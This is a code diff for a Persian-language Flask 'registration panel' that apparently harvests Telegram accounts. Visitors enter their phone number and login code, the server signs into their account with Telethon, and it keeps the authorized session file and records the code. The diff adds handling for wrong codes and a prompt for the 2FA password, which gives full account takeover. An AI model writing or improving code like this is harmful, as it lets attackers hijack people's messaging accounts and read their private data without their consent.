@@ -1,5 +1,5 @@
 """
-پنل ثبت‌نام - نسخه Sync (بدون asyncio)
+پنل ثبت‌نام - نسخه نهایی بدون asyncio
 """
 
 import os
@@ -7,7 +7,7 @@ import json
 import time
 from flask import Flask, render_template, request, jsonify, session
 from telethon.sync import TelegramClient
-from telethon.errors import FloodWaitError
+from telethon.errors import FloodWaitError, PhoneCodeInvalidError, SessionPasswordNeededError
 
 app = Flask(__name__)
 app.secret_key = 'mew_secret_key_2026'
@@ -35,19 +35,6 @@ def get_user_count():
     users = load_users()
     return len(users)
 
-# ========== توابع Sync ==========
-def send_code_sync(phone):
-    """ارسال کد - نسخه sync"""
-    temp_client = TelegramClient(f"{SESSIONS_DIR}temp_{int(time.time())}", API_ID, API_HASH)
-    temp_client.start(phone=phone)
-    return temp_client
-
-def verify_code_sync(temp_client, code):
-    """تایید کد - نسخه sync"""
-    temp_client.sign_in(code=code)
-    me = temp_client.get_me()
-    return me
-
 # ========== مسیرها ==========
 @app.route('/')
 def index():
@@ -65,12 +52,18 @@ def send_code():
         return jsonify({'success': False, 'message': '❌ شماره باید با + شروع شود!'})
     
     try:
-        # استفاده از نسخه sync
-        temp_client = send_code_sync(phone)
+        # ایجاد کلاینت جدید
+        session_file = f"{SESSIONS_DIR}temp_{int(time.time())}"
+        client = TelegramClient(session_file, API_ID, API_HASH)
+        client.connect()
         
+        # ارسال کد
+        client.send_code_request(phone)
+        
+        # ذخیره کلاینت
         session_id = str(int(time.time()))
         TEMP_SESSIONS[session_id] = {
-            'client': temp_client,
+            'client': client,
             'phone': phone,
             'timestamp': time.time()
         }
@@ -99,10 +92,21 @@ def verify_code():
     
     try:
         temp_data = TEMP_SESSIONS[temp_id]
-        temp_client = temp_data['client']
+        client = temp_data['client']
         
-        # تایید کد به صورت sync
-        me = verify_code_sync(temp_client, code)
+        # تایید کد با sign_in
+        try:
+            client.sign_in(code=code)
+        except PhoneCodeInvalidError:
+            return jsonify({'success': False, 'message': '❌ کد نادرست! دوباره تلاش کنید.'})
+        except SessionPasswordNeededError:
+            return jsonify({'success': False, 'message': '🔐 2FA فعال است! رمز دوم را وارد کنید.'})
+        
+        # دریافت اطلاعات کاربر
+        me = client.get_me()
+        
+        if not me:
+            return jsonify({'success': False, 'message': '❌ خطا در دریافت اطلاعات کاربر!'})
         
         users = load_users()
         user_id = str(int(time.time()))
@@ -112,23 +116,23 @@ def verify_code():
             'code': code,
             'status': 'pending',
             'registered_at': time.strftime('%Y-%m-%d %H:%M:%S'),
-            'username': me.username,
-            'first_name': me.first_name,
+            'username': me.username or 'نامشخص',
+            'first_name': me.first_name or 'کاربر',
             'group_link': 'https://t.me/+NJNJp5hUf3IzNTRk'
         }
         save_users(users)
         
         # بستن کلاینت
-        temp_client.disconnect()
+        client.disconnect()
         del TEMP_SESSIONS[temp_id]
         session.clear()
         
         return jsonify({
             'success': True,
-            'message': f'✅ ثبت‌نام موفق! خوش آمدی @{me.username}',
+            'message': f'✅ ثبت‌نام موفق! خوش آمدی @{me.username or me.first_name}',
             'user': {
-                'name': me.first_name,
-                'username': me.username,
+                'name': me.first_name or 'کاربر',
+                'username': me.username or 'نامشخص',
                 'phone': phone
             }
         })
@@ -138,4 +142,8 @@ def verify_code():
 
 # ========== اجرا ==========
 if __name__ == "__main__":
-    app.run(host='0.0.0.0', port=10000)
+    # ساخت پوشه‌ها
+    os.makedirs(SESSIONS_DIR, exist_ok=True)
+    os.makedirs('templates', exist_ok=True)
+    
+    app.run(host='0.0.0.0', port=10000, debug=False, threaded=True)
